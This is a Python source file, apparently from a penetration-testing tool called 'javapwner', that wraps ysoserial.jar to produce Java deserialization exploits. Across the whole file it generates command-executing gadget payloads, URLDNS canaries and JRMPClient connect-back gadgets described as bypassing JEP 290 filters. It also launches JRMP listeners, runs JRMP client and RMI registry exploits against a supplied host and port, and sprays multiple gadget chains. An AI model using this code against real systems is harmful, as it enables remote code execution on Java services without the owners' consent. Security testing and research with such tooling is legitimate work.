"""YsoserialWrapper — subprocess-based interface to ysoserial.jar.

Supports:
  - Payload generation (any gadget + command)
  - URLDNS canary generation
  - JRMPClient gadget generation (for JEP 290 bypass)
  - JRMP listener mode (via ysoserial.exploit.JRMPListener)
  - Gadget spraying (try multiple gadgets)
  - LRU caching for repeated generation
  - Fork mode (background subprocess)
"""

from __future__ import annotations

import hashlib
import os
import re
import subprocess
from functools import cached_property
from pathlib import Path

from javapwner.exceptions import PayloadError

# Ysoserial exits with code 1 even when just printing help/gadget list.
_GADGET_PATTERN = re.compile(r"^\s{3,}(\w+)\s+@\w+", re.MULTILINE)

_TIMEOUT_GENERATE = 30  # seconds

# --add-opens flags required for ysoserial gadgets that use internal reflection
# on JDK 9+ (strong encapsulation). CommonsCollections1 needs sun.reflect.annotation;
# JRMP-based gadgets need sun.rmi.transport.
_YSOSERIAL_OPENS: tuple[str, ...] = (
    "--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED",
    "--add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED",
    "--add-opens=java.base/java.util=ALL-UNNAMED",
)

# Module-level cache for detected Java major version (populated on first use).
_JAVA_MAJOR_VERSION: int | None = None


def _detect_java_major_version() -> int:
    """Return the major JVM version (8, 11, 17, …). Returns 0 if undetectable."""
    global _JAVA_MAJOR_VERSION
    if _JAVA_MAJOR_VERSION is not None:
        return _JAVA_MAJOR_VERSION
    version = 0
    try:
        proc = subprocess.run(
            ["java", "-version"],
            capture_output=True,
            timeout=10,
        )
        raw = proc.stderr or proc.stdout or b""
        output = raw.decode(errors="replace") if isinstance(raw, bytes) else ""
        m = re.search(r'"(\d+)(?:\.(\d+))?', output)
        if m:
            major = int(m.group(1))
            version = int(m.group(2)) if major == 1 else major
    except Exception:
        pass
    _JAVA_MAJOR_VERSION = version
    return version


def _java_opens() -> list[str]:
    """Return --add-opens flags for ysoserial when running on JDK 9+."""
    return list(_YSOSERIAL_OPENS) if _detect_java_major_version() >= 9 else []


def _find_ysoserial_jar() -> Path | None:
    """Locate ysoserial.jar using the documented search order."""
    # 1. Environment variable
    env_path = os.environ.get("YSOSERIAL_PATH")
    if env_path:
        p = Path(env_path)
        if p.is_file():
            return p

    # 2. lib/ysoserial.jar relative to this file's package root
    pkg_root = Path(__file__).resolve().parent.parent.parent  # project root
    candidate = pkg_root / "lib" / "ysoserial.jar"
    if candidate.is_file():
        return candidate

    # 3. CWD
    cwd_candidate = Path.cwd() / "ysoserial.jar"
    if cwd_candidate.is_file():
        return cwd_candidate

    return None


class YsoserialWrapper:
    """Thin wrapper around ysoserial invoked via subprocess.

    Parameters
    ----------
    jar_path:
        Path to ysoserial-all.jar.  If ``None``, auto-detected.
    fork:
        If ``True``, long-running operations (like listeners) are started
        as background subprocesses that don't block.
    """

    def __init__(self, jar_path: str | Path | None = None, fork: bool = False):
        if jar_path is not None:
            self._jar = Path(jar_path)
        else:
            found = _find_ysoserial_jar()
            if found is None:
                raise PayloadError(
                    "ysoserial.jar not found. Set YSOSERIAL_PATH env var, "
                    "place it in lib/ysoserial.jar, or put it in CWD."
                )
            self._jar = found
        self._fork = fork
        self._background_procs: list[subprocess.Popen] = []
        # Per-instance cache (I.2) — keyed on (gadget, command).
        # Instance-level so that different jar_path instances don't share state.
        self._cache: dict[str, bytes] = {}
        # Tracks whether this JVM needs --add-opens for ysoserial gadgets.
        # None = unknown (auto-detect on first failed generate), True/False = detected.
        self._needs_opens: bool | None = None

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def generate(self, gadget: str, command: str) -> bytes:
        """Generate a serialized payload for *gadget* executing *command*.

        Returns the raw bytes of the payload. Uses an LRU cache to avoid
        regenerating identical payloads. Raises :class:`PayloadError`
        on failure, empty output, or timeout.
        """
        cache_key = f"{gadget}:{command}"
        if cache_key in self._cache:
            return self._cache[cache_key]

        # Build command: include --add-opens only if already known to be needed.
        opens = list(_YSOSERIAL_OPENS) if self._needs_opens else []
        cmd = ["java"] + opens + ["-jar", str(self._jar), gadget, command]

        try:
            result = subprocess.run(cmd, capture_output=True, timeout=_TIMEOUT_GENERATE)
        except subprocess.TimeoutExpired as exc:
            raise PayloadError(f"ysoserial timed out after {_TIMEOUT_GENERATE}s") from exc
        except FileNotFoundError as exc:
            raise PayloadError("java binary not found in PATH") from exc

        payload = result.stdout
        if not payload:
            stderr_text = (
                result.stderr.decode(errors="replace")
                if isinstance(result.stderr, bytes)
                else ""
            )
            # JDK 9+ strong encapsulation: retry with --add-opens flags.
            if self._needs_opens is None and (
                "InaccessibleObjectException" in stderr_text
                or "--add-opens" in stderr_text
            ):
                self._needs_opens = True
                cmd = ["java"] + list(_YSOSERIAL_OPENS) + ["-jar", str(self._jar), gadget, command]
                try:
                    result = subprocess.run(
                        cmd, capture_output=True, timeout=_TIMEOUT_GENERATE
                    )
                except subprocess.TimeoutExpired as exc:
                    raise PayloadError(f"ysoserial timed out after {_TIMEOUT_GENERATE}s") from exc
                except FileNotFoundError as exc:
                    raise PayloadError("java binary not found in PATH") from exc
                payload = result.stdout
                stderr_text = (
                    result.stderr.decode(errors="replace")
                    if isinstance(result.stderr, bytes)
                    else ""
                )

            if not payload:
                raise PayloadError(
                    f"ysoserial returned empty payload for gadget '{gadget}'. "
                    f"Stderr: {stderr_text[:200]}"
                )
        elif self._needs_opens is None:
            self._needs_opens = False

        self._cache[cache_key] = payload
        return payload

    def generate_urldns(self, url: str) -> bytes:
        """Convenience wrapper for the URLDNS gadget (no Java needed on target)."""
        return self.generate("URLDNS", url)

    @cached_property
    def _gadget_list(self) -> list[str]:
        try:
            result = subprocess.run(
                ["java"] + _java_opens() + ["-jar", str(self._jar)],
                capture_output=True,
                timeout=_TIMEOUT_GENERATE,
            )
        except subprocess.TimeoutExpired as exc:
            raise PayloadError("ysoserial timed out while listing gadgets") from exc
        except FileNotFoundError as exc:
            raise PayloadError("java binary not found in PATH") from exc

        # ysoserial prints the gadget table to stderr
        output = result.stderr.decode(errors="replace")
        gadgets = _GADGET_PATTERN.findall(output)
        return gadgets

    def list_gadgets(self) -> list[str]:
        """Return the list of available gadget chain names."""
        return list(self._gadget_list)

    def validate_gadget(self, gadget: str) -> bool:
        """Return True if *gadget* is present in the ysoserial gadget list."""
        return gadget in self._gadget_list

    # ------------------------------------------------------------------
    # I.1 — Exploit modes (JRMP listener, JRMP client, registry exploit)
    # ------------------------------------------------------------------

    def run_jrmp_listener(
        self, port: int, gadget: str, command: str,
    ) -> subprocess.Popen | subprocess.CompletedProcess:
        """Start ysoserial JRMP listener on *port*.

        In fork mode, returns a ``Popen`` (background).
        Otherwise, blocks until the listener exits.
        """
        cmd = (
            ["java"] + _java_opens()
            + ["-cp", str(self._jar), "ysoserial.exploit.JRMPListener",
               str(port), gadget, command]
        )
        if self._fork:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
            self._background_procs.append(proc)
            return proc

        try:
            return subprocess.run(
                cmd, capture_output=True, timeout=_TIMEOUT_GENERATE * 4,
            )
        except subprocess.TimeoutExpired as exc:
            raise PayloadError("JRMP listener timed out") from exc
        except FileNotFoundError as exc:
            raise PayloadError("java binary not found in PATH") from exc

    def run_jrmp_client(
        self, host: str, port: int, gadget: str, command: str,
    ) -> subprocess.CompletedProcess:
        """Run ysoserial JRMP client exploit against *host:port*."""
        cmd = (
            ["java"] + _java_opens()
            + ["-cp", str(self._jar), "ysoserial.exploit.JRMPClient",
               host, str(port), gadget, command]
        )
        try:
            return subprocess.run(
                cmd, capture_output=True, timeout=_TIMEOUT_GENERATE,
            )
        except subprocess.TimeoutExpired as exc:
            raise PayloadError("JRMP client timed out") from exc
        except FileNotFoundError as exc:
            raise PayloadError("java binary not found in PATH") from exc

    def run_rmi_registry_exploit(
        self, host: str, port: int, gadget: str, command: str,
    ) -> subprocess.CompletedProcess:
        """Run ysoserial RMI registry exploit against *host:port*."""
        cmd = (
            ["java"] + _java_opens()
            + ["-cp", str(self._jar), "ysoserial.exploit.RMIRegistryExploit",
               host, str(port), gadget, command]
        )
        try:
            return subprocess.run(
                cmd, capture_output=True, timeout=_TIMEOUT_GENERATE,
            )
        except subprocess.TimeoutExpired as exc:
            raise PayloadError("RMI registry exploit timed out") from exc
        except FileNotFoundError as exc:
            raise PayloadError("java binary not found in PATH") from exc

    # ------------------------------------------------------------------
    # I.3 — JRMPClient gadget generation
    # ------------------------------------------------------------------

    def generate_marshal_bytes(self, gadget: str, command: str) -> bytes:
        """Generate a payload serialized via MarshalOutputStream.

        Plain ysoserial output uses ObjectOutputStream, which writes empty class
        annotations (TC_ENDBLOCKDATA only).  Java RMI's MarshalInputStream reads
        the annotation with readObject(), so it expects TC_NULL before
        TC_ENDBLOCKDATA.  This mismatch de-syncs the stream and prevents the
        gadget from deserializing.

        MarshalSerializer.java re-serializes the gadget using a custom inner
        class that mirrors sun.rmi.server.MarshalOutputStream: it writes
        writeObject(null) (→ TC_NULL) for every annotateClass() call.

        Returns bytes starting with ACED0005 (full OOS stream), suitable for
        passing to build_dgc_dirty_call() which strips the header and wraps
        the content in the JRMP MSG_CALL / DGC dirty() structure.

        Falls back to plain generate() if MarshalSerializer.class is absent.
        """
        lib_dir = Path(__file__).resolve().parent.parent.parent / "lib"
        class_file = lib_dir / "MarshalSerializer.class"
        if not class_file.is_file():
            return self.generate(gadget, command)

        cp = f"{lib_dir}{os.pathsep}{self._jar}"
        cmd = (
            ["java"] + _java_opens()
            + ["-cp", cp, "MarshalSerializer", gadget, command]
        )
        try:
            result = subprocess.run(
                cmd, capture_output=True, timeout=_TIMEOUT_GENERATE,
            )
        except subprocess.TimeoutExpired as exc:
            raise PayloadError(f"MarshalSerializer timed out after {_TIMEOUT_GENERATE}s") from exc
        except FileNotFoundError as exc:
            raise PayloadError("java binary not found in PATH") from exc

        payload = result.stdout
        if not payload or not payload.startswith(b"\xac\xed"):
            stderr_text = result.stderr.decode(errors="replace") if result.stderr else ""
            raise PayloadError(
                f"MarshalSerializer returned invalid output for gadget '{gadget}'. "
                f"Stderr: {stderr_text[:200]}"
            )
        return payload

    def generate_jrmp_client_gadget(self, listener_host: str, listener_port: int) -> bytes:
        """Generate a JRMPClient payload pointing to *listener_host:listener_port*.

        This gadget causes the target to connect back to a JRMP listener.
        Used for JEP 290 bypass: the connecting client's deserialization
        happens outside the JEP 290 filter.
        """
        return self.generate("JRMPClient", f"{listener_host}:{listener_port}")

    # ------------------------------------------------------------------
    # I.4 — Gadget spraying
    # ------------------------------------------------------------------

    def generate_spray(
        self, gadgets: list[str], command: str,
    ) -> dict[str, bytes | str]:
        """Generate payloads for multiple gadget chains.

        Returns a dict of ``{gadget_name: payload_bytes}`` for successful
        generations, and ``{gadget_name: error_string}`` for failures.
        """
        results: dict[str, bytes | str] = {}
        for gadget in gadgets:
            try:
                results[gadget] = self.generate(gadget, command)
            except PayloadError as exc:
                results[gadget] = f"ERROR: {exc}"
        return results

    # ------------------------------------------------------------------
    # I.5 — Fork support / cleanup
    # ------------------------------------------------------------------

    def cleanup(self) -> None:
        """Terminate any background subprocesses."""
        for proc in self._background_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        self._background_procs.clear()

    @property
    def jar_path(self) -> Path:
        """Return the resolved path to ysoserial.jar."""
        return self._jar
